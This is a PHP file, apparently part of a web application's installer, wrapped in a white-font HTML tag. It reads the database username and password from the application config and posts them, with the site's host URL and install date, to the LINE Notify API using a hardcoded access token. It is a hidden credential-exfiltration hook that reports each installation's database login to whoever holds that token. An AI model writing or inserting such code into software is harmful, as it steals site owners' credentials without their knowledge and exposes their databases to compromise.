<font color="ffffff">
     
         <?php
      require_once('../application/config/database.php');
$line_api = 'https://notify-api.line.me/api/notify';
$access_token = 'awLZkIsvzYTvlYtdTG7rTlEDqbLPYRZddE2AImazFNG';
?>

 <?php

$user = $db['default']['username'];
$pass = $db['default']['password'];

$datecr= date("Y-m-d H:i:s");
$host=getenv('HTTP_HOST');

if (isset($mm)) { 
} else {
$str ='
*******************
🌍 ลิ้ง  : http://'.$host.'
🚻 ชื่อ db   : '.$user.'        
🔐 รหัส db : '.$pass.'
🕘 วันที่ติดตั้ง '.$datecr;
}

//ข้อความที่ต้องการส่ง สูงสุด 1000 ตัวอักษร


$image_thumbnail_url = '';  // ขนาดสูงสุด 240?240px JPEG
$image_fullsize_url = '';  // ขนาดสูงสุด 1024?1024px JPEG
$sticker_package_id = '';  // Package ID ของสติกเกอร์
$sticker_id = '';    // ID ของสติกเกอร์

$message_data = array(
 'message' => $str,
 'imageThumbnail' => $image_thumbnail_url,
 'imageFullsize' => $image_fullsize_url,
 'stickerPackageId' => $sticker_package_id,
 'stickerId' => $sticker_id
);




if (isset($success)) { 	 
$result = send_notify_message($line_api, $access_token, $message_data);
print_r($result);
$_SESSION['regist']      = 0;
}


function send_notify_message($line_api, $access_token, $message_data)
{
 $headers = array('Method: POST', 'Content-type: multipart/form-data', 'Authorization: Bearer '.$access_token );

 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $line_api);
 curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_POSTFIELDS, $message_data);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $result = curl_exec($ch);
 // Check Error
 if(curl_error($ch))
 {
  $return_array = array( 'status' => '000: send fail', 'message' => curl_error($ch) ); 
 }
 else
 {
  $return_array = json_decode($result, true);
 }
 curl_close($ch);
return $return_array;
}


?>
	</font>

